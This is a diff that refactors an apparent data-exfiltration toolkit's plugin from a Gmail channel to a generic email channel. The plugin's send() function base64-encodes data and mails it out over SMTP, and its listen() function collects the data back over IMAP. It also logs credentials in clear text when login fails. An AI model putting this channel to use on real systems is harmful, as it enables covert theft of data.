@@ -6,38 +6,35 @@ import time
 import sys
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import traceback
 
 app_exfiltrate = None
-gmail_user = ''
-gmail_pwd = ''
-server = ''
-server_port = 587
-
+config = None
 
 def send(data):
-    mail_server = SMTP(server)
-    mail_server.connect(server, server_port)
+    mail_server = SMTP(config['smtp_server'], port=config['smtp_port'])
+    mail_server.connect(config['smtp_server'], config['smtp_port'])
     mail_server.starttls()
-    mail_server.login(gmail_user, gmail_pwd)
+    mail_server.login(config['username'], config['password'])
 
     msg = MIMEMultipart()
-    msg['From'] = gmail_user
-    msg['To'] = gmail_user
+    msg['From'] = config['username']
+    msg['To'] = config['username']
     msg['Subject'] = "det:toolkit"
     msg.attach(MIMEText(base64.b64encode(data.encode()).decode()))
     app_exfiltrate.log_message(
-        'info', "[gmail] Sending {} bytes in mail".format(len(data)))
-    mail_server.sendmail(gmail_user, gmail_user, msg.as_string())
-
+        'info', "[email] Sending {} bytes in mail".format(len(data)))
+    mail_server.sendmail(config['username'], config['username'], msg.as_string())
 
 def listen():
-    app_exfiltrate.log_message('info', "[gmail] Listening for mails...")
-    client_imap = imaplib.IMAP4_SSL(server)
+    app_exfiltrate.log_message('info', "[email] Listening for mails...")
+    client_imap = imaplib.IMAP4_SSL(config['imap_server'], port=config['imap_port'])
     try:
-        client_imap.login(gmail_user, gmail_pwd)
-    except:
+        client_imap.login(config['username'], config['password'])
+    except Exception:
+        traceback.print_exc()
         app_exfiltrate.log_message(
-            'warning', "[gmail] Did not manage to authenticate with creds: {}:{}".format(gmail_user, gmail_pwd))
+            'warning', "[email] Did not manage to authenticate with creds: {}:{}".format(config['username'], config['password']))
         sys.exit(-1)
 
     while True:
@@ -67,16 +64,12 @@ def listen():
 
 
 def proxy():
-    app_exfiltrate.log_message('info', "[proxy] [gmail] proxy mode unavailable (useless) for gmail plugin...")
+    app_exfiltrate.log_message('info', "[proxy] [email] proxy mode unavailable (useless) for email plugin...")
 
 
 class Plugin:
-
-    def __init__(self, app, options):
-        global app_exfiltrate, gmail_pwd, gmail_user, server, server_port
-        gmail_pwd = options['password']
-        gmail_user = options['username']
-        server = options['server']
-        server_port = options['port']
-        app.register_plugin('gmail', {'send': send, 'listen': listen, 'proxy': proxy})
+    def __init__(self, app, conf):
+        global app_exfiltrate, config
+        config = conf
+        app.register_plugin('email', {'send': send, 'listen': listen, 'proxy': proxy})
         app_exfiltrate = app
